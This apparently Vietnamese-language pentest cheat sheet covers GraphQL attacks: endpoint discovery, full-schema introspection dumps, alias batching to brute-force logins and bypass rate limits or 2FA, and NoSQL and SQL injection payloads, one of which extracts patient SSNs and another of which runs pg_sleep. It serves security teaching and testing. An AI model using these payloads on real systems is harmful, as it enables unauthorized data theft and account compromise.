# GraphQL Injection

> GraphQL là một ngôn ngữ truy vấn dành cho API và một runtime để thực thi các truy vấn đó với dữ liệu hiện có. Một dịch vụ GraphQL được tạo ra bằng cách định nghĩa các type và field trên các type đó, sau đó cung cấp các hàm cho mỗi field trên mỗi type

## Tóm tắt

- [Công cụ](#tools)
- [Liệt kê thông tin (Enumeration)](#enumeration)
    - [Các Endpoint GraphQL Phổ Biến](#common-graphql-endpoints)
    - [Xác Định Điểm Chèn (Injection Point)](#identify-an-injection-point)
    - [Liệt Kê Schema Cơ Sở Dữ Liệu qua Introspection](#enumerate-database-schema-via-introspection)
    - [Liệt Kê Schema Cơ Sở Dữ Liệu qua Gợi Ý (Suggestions)](#enumerate-database-schema-via-suggestions)
    - [Liệt Kê Định Nghĩa Các Type](#enumerate-types-definition)
    - [Liệt Kê Các Đường Dẫn Đến Một Type Mục Tiêu](#enumerating-paths-to-a-target-type)
- [Phương pháp](#methodology)
    - [Queries](#queries)
        - [Query Cơ Bản](#basic-query)
        - [Query Với Tham Số](#query-with-arguments)
        - [Nested Queries](#nested-queries)
    - [Mutations](#mutations)
    - [Tấn Công GraphQL Batching](#graphql-batching-attacks)
        - [Batching Dựa Trên JSON List](#json-list-based-batching)
        - [Batching Dựa Trên Tên Query](#query-name-based-batching)
- [Injections](#injections)
    - [NOSQL Injection](#nosql-injection)
    - [SQL Injection](#sql-injection)
- [Labs](#labs)
- [Tài liệu tham khảo](#references)

## Công cụ

- [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - Công cụ scripting để tương tác với một endpoint graphql cho mục đích pentest
- [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - Tài liệu nghiên cứu bảo mật GraphQL
- [doyensec/inql](https://github.com/doyensec/inql) - Một Burp Extension dành cho kiểm thử bảo mật GraphQL
- [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - phân tích schema introspection của GraphQL và tạo ra các query có thể có
- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Liệt kê các cách khác nhau để tiếp cận một type cho trước trong một schema GraphQL
- [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - Một IDE toàn diện để khám phá các API GraphQL
- [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - Lấy schema API GraphQL ngay cả khi introspection đã bị vô hiệu hóa
- [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - Một tiện ích brute-force mật khẩu và fuzzing cho GraphQL
- [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - Framework mối đe dọa GraphQL được các chuyên gia bảo mật sử dụng để nghiên cứu các lỗ hổng bảo mật trong các triển khai GraphQL
- [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - Tiện ích kiểm toán bảo mật dành cho API GraphQL
- [dolevf/graphw00f](https://github.com/dolevf/graphw00f) - Tiện ích fingerprint GraphQL Server Engine
- [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - Biểu diễn bất kỳ API GraphQL nào thành một đồ thị tương tác
- [Insomnia](https://insomnia.rest/) - Client HTTP và GraphQL đa nền tảng

## Liệt kê thông tin (Enumeration)

### Các Endpoint GraphQL Phổ Biến

Các endpoint GraphQL thường được đặt ở những đường dẫn dễ đoán, phổ biến nhất là:

- `/graphql`
- `/graphiql` (IDE tương tác)

Bạn nên luôn dò tìm cả các giao diện API lẫn giao diện dành cho nhà phát triển/debug.

```ps1
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```

Để có một wordlist mở rộng hơn, xem [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt).

### Xác Định Điểm Chèn (Injection Point)

> Một server BẮT BUỘC phải chấp nhận các request POST, và CÓ THỂ chấp nhận các phương thức HTTP khác, chẳng hạn như GET. - [GraphQL Over HTTP](https://graphql.github.io/graphql-over-http/draft/#sec-Request)

- Endpoint GET

    ```js
    GET /graphql?query={yourQueryHere}
    GET /graphql?query={__schema{types{name}}}
    GET /graphiql?query={__schema{types{name}}}
    GET /graphql?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D
    ```

- Endpoint POST

    ```js
    POST /graphql/v1 HTTP/1.1
    Host: example.com
    Content-Type: application/json

    {
    "query": "query { user { id name } }"
    }
    ```

Kiểm tra xem các lỗi có hiển thị hay không.

```javascript
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

### Liệt Kê Schema Cơ Sở Dữ Liệu qua Introspection

Đặc tả GraphQL bao gồm các field đặc biệt, chẳng hạn như `__schema` và `__type`, cho phép client hỏi server những type nào tồn tại, chúng expose những field nào, và mọi thứ kết nối với nhau như thế nào.

Một introspection query đơn giản là một request tận dụng các field đặc biệt này để lấy được thông tin cấu trúc đó. Đây là điều cho phép các môi trường tương tác như GraphiQL hoặc GraphQL Playground cung cấp tính năng tự động hoàn thành (auto-completion), tài liệu nội tuyến (inline documentation), và kiểm tra hợp lệ query. Khi một nhà phát triển gõ một query, công cụ không phải đang đoán, nó đã hỏi server trước đó rằng cái gì hợp lệ và cái gì không.

Một ví dụ tối giản trông như thế này:

```js
{
  "query": "{ __schema { types { name } } }"
}
```

Query đã được URL encode để dump schema cơ sở dữ liệu.

```js
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

Query đã được URL decode để dump schema cơ sở dữ liệu.

```rs
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```

Các query một dòng để dump schema cơ sở dữ liệu mà không cần fragment.

```rs
__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
```

```rs
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

### Liệt Kê Schema Cơ Sở Dữ Liệu qua Gợi Ý (Suggestions)

Khi bạn sử dụng một từ khóa không xác định, backend GraphQL sẽ phản hồi bằng một gợi ý liên quan đến schema của nó.

```json
{
  "message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",
}
```

Bạn cũng có thể thử bruteforce các từ khóa, field và tên type đã biết bằng cách sử dụng các wordlist như [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist) khi schema của một API GraphQL không thể truy cập được.

### Liệt Kê Định Nghĩa Các Type

Liệt kê định nghĩa của các type thú vị bằng cách sử dụng query GraphQL sau đây, thay thế "User" bằng type đã chọn

```javascript
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

### Liệt Kê Các Đường Dẫn Đến Một Type Mục Tiêu

Khi làm việc với một schema GraphQL, đặc biệt là sau khi chạy một introspection query, không phải lúc nào cũng rõ ràng làm thế nào một type cụ thể có thể được truy cập thông qua các query. Một object cho trước (như `User`, `Admin`, hoặc `Payment`) có thể được tiếp cận thông qua nhiều điểm vào (entry point) và các mối quan hệ lồng nhau (nested relationships).

- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Công cụ liệt kê các cách khác nhau để tiếp cận một type cho trước trong một schema GraphQL.

Công cụ này lấy đầu ra JSON của một introspection query (mô tả toàn bộ schema) và phân tích cách các type được kết nối với nhau. Sau đó nó xuất ra các đường dẫn query khác nhau có thể được dùng để tiếp cận một type mục tiêu cụ thể. Trong thực tế, điều này có nghĩa là xác định tất cả các cách có thể mà một client có thể tạo ra các query để cuối cùng trả về object đó, ngay cả khi nó lồng sâu hoặc được expose gián tiếp.

```php
graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
Found 27 ways to reach the "Skill" node from the "Query" node:
- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (skills) -> Skill
```

## Phương pháp

GraphQL hỗ trợ ba loại thao tác chính: **queries**, **mutations**, và **subscriptions**.

### Queries

Các query GraphQL được dùng để yêu cầu các field cụ thể từ một schema, và cấu trúc của query của bạn phản ánh trực tiếp cấu trúc JSON response mà bạn sẽ nhận được. Ở dạng đơn giản nhất, việc truy vấn dữ liệu có nghĩa là chọn một field gốc (như `user`, `posts`, hoặc `teams`) rồi chỉ định các subfield nào bạn muốn được trả về. Không giống như REST, bạn không bao giờ nhận được dữ liệu thừa, mọi thứ phải được yêu cầu một cách rõ ràng.

#### Query Cơ Bản

Query đơn giản nhất sử dụng cú pháp rút gọn, trong đó từ khóa `query` được bỏ qua. Bạn chỉ cần định nghĩa các field bạn muốn bắt đầu từ object gốc.

```js
{
  user {
    id
    name
  }
}
```

Điều này yêu cầu server trả về các field `id` và `name` từ object user. Response sẽ tuân theo chính xác cấu trúc tương tự. Nếu cần, cú pháp đầy đủ có thể được sử dụng với từ khóa query, nhưng trong hầu hết các trường hợp, cú pháp rút gọn là đủ và thường thấy trong lưu lượng truy cập thực tế.

```js
query {
  user {
    id
    name
  }
}
```

![HTB Help - GraphQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)

#### Query Với Tham Số

Để lấy dữ liệu cụ thể, các tham số có thể được truyền vào các field. Chúng hoạt động giống như các tham số hàm và thường được sử dụng cho ID, bộ lọc, hoặc các query tìm kiếm.

```js
{
  user(id: "1") {
    name
    email
  }
}
```

Điều này cho phép nhắm mục tiêu chính xác vào các object và là một điểm vào phổ biến để kiểm tra các vấn đề kiểm soát truy cập hoặc các lỗ hổng kiểu IDOR.

#### Nested Queries

GraphQL cho phép duyệt sâu qua các mối quan hệ trong một request duy nhất. Thay vì phải xâu chuỗi nhiều lệnh gọi API, bạn có thể khám phá các object được liên kết trực tiếp.

```js
{
  user(id: "1") {
    name
    posts {
      title
      comments {
        content
      }
    }
  }
}
```

### Mutations

Mutation là một thao tác được dùng để thay đổi dữ liệu trên server (tạo, cập nhật, hoặc xóa một thứ gì đó).
Mutations hoạt động giống như hàm, bạn có thể sử dụng chúng để tương tác với endpoint GraphQL.

```javascript
mutation{
  signIn(login:"Admin", password:"secretp@ssw0rd"){
      token
    }
}

mutation{
  addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {
    id
    name
    email
  }
}
```

**Cảnh báo**: Mutations thường sẽ không hoạt động với GET. [graphql/graphql-over-http, issue #123](https://github.com/graphql/graphql-over-http/issues/123)

### Tấn Công GraphQL Batching

Các kịch bản phổ biến:

- Kịch bản khuếch đại brute-force mật khẩu
- Vượt qua giới hạn tần suất (Rate Limit bypass)
- Vượt qua 2FA

#### Batching Dựa Trên JSON List

> Query batching là một tính năng của GraphQL cho phép gửi nhiều query đến server trong một request HTTP duy nhất. Thay vì gửi mỗi query trong một request riêng biệt, client có thể gửi một mảng các query trong một request POST duy nhất đến server GraphQL. Điều này giảm số lượng request HTTP và có thể cải thiện hiệu suất của ứng dụng.

Query batching hoạt động bằng cách định nghĩa một mảng các thao tác trong body của request. Mỗi thao tác có thể có query, biến (variables), và tên thao tác riêng của nó. Server xử lý từng thao tác trong mảng và trả về một mảng các response, mỗi response tương ứng với một query trong batch.

```json
[
    {
        "query":"..."
    },{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ...
]
```

#### Batching Dựa Trên Tên Query

```json
{
    "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
}
```

Gửi cùng một mutation nhiều lần bằng cách sử dụng alias

```js
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
  fourth: login(pass: 4444, username: "bob")
}
```

## Injections

> SQL và NoSQL Injection vẫn có thể xảy ra vì GraphQL chỉ là một lớp trung gian giữa client và cơ sở dữ liệu.

### NOSQL Injection

Sử dụng `$regex` bên trong tham số `search`.

```js
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
    {
      firstName lastName id patients{ssn}
    }
}
```

### SQL Injection

Gửi một dấu nháy đơn `'` bên trong một tham số GraphQL để kích hoạt SQL injection

```js
{ 
    bacon(id: "1'") { 
        id, 
        type, 
        price
    }
}
```

SQL injection đơn giản bên trong một field GraphQL.

```powershell
query {
  user(name: "patt';SELECT 1;SELECT pg_sleep(30);--'") {
    id
    email
  }
}
```

## Labs

- [PortSwigger - Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)
- [PortSwigger - Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
- [PortSwigger - Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)
- [PortSwigger - Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)
- [PortSwigger - Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
- [Root Me - GraphQL - Introspection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Introspection)
- [Root Me - GraphQL - Injection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Injection)
- [Root Me - GraphQL - Backend injection](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Backend-injection)
- [Root Me - GraphQL - Mutation](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Mutation)

## Tài liệu tham khảo

- [Building a free open source GraphQL wordlist for penetration testing - Nohé Hinniger-Foray - August 17, 2023](https://web.archive.org/web/20230919211552/https://escape.tech/blog/graphql-security-wordlist/)
- [Exploiting GraphQL - AssetNote - Shubham Shah - August 29, 2021](https://web.archive.org/web/20210830161635/https://blog.assetnote.io/2021/08/29/exploiting-graphql/)
- [GraphQL Batching Attack - Wallarm - December 13, 2019](https://web.archive.org/web/20260223043402/https://lab.wallarm.com/graphql-batching-attack/)
- [GraphQL for Pentesters presentation - Alexandre ZANNI (@noraj) - December 1, 2022](https://web.archive.org/web/20230205233412/https://acceis.github.io/prez-graphql/)
- [API Hacking GraphQL - @ghostlulz - June 8, 2019](https://web.archive.org/web/20190619040847/https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
- [Discovering GraphQL endpoints and SQLi vulnerabilities - Matías Choren - September 23, 2018](https://web.archive.org/web/20180923085151/https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e)
- [GraphQL abuse: Bypass account level permissions through parameter smuggling - Jon Bottarini - March 14, 2018](https://web.archive.org/web/20231027032512/https://labs.detectify.com/2018/03/14/graphql-abuse/)
- [Graphql Bug to Steal Anyone's Address - Pratik Yadav - September 1, 2019](https://web.archive.org/web/20250514221822/https://medium.com/@pratiky054/graphql-bug-to-steal-anyones-address-fc34f0374417)
- [GraphQL cheatsheet - devhints.io - November 7, 2018](https://web.archive.org/web/20181107093033/https://devhints.io/graphql)
- [GraphQL Introspection - GraphQL - August 21, 2024](https://web.archive.org/web/20260302160506/https://graphql.org/learn/introspection/)
- [GraphQL NoSQL Injection Through JSON Types - Pete Corey - June 12, 2017](https://web.archive.org/web/20250514221852/https://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/)
- [HIP19 Writeup - Meet Your Doctor 1,2,3 - Swissky - June 22, 2019](https://web.archive.org/web/20190825033521/https://swisskyrepo.github.io/HIP19-MeetYourDoctor/)
- [How to set up a GraphQL Server using Node.js, Express & MongoDB - Leonardo Maldonado - November 5, 2018](https://web.archive.org/web/20190718023950/https://www.freecodecamp.org/news/how-to-set-up-a-graphql-server-using-node-js-express-mongodb-52421b73f474/)
- [Introduction to GraphQL - GraphQL - November 1, 2024](https://web.archive.org/web/20160917011216/http://graphql.org:80/learn)
- [Introspection query leaks sensitive graphql system information - @Zuriel - November 18, 2017](https://web.archive.org/web/20250710175416/https://hackerone.com/reports/291531)
- [Looting GraphQL Endpoints for Fun and Profit - @theRaz0r - June 8, 2017](https://web.archive.org/web/20170608142208/https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/)
- [Securing Your GraphQL API from Malicious Queries - Max Stoiber - February 21, 2018](https://web.archive.org/web/20180731231915/https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b)
- [SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter - Jobert Abma (jobert) - November 6, 2018](https://web.archive.org/web/20181203004543/https://hackerone.com/reports/435066)
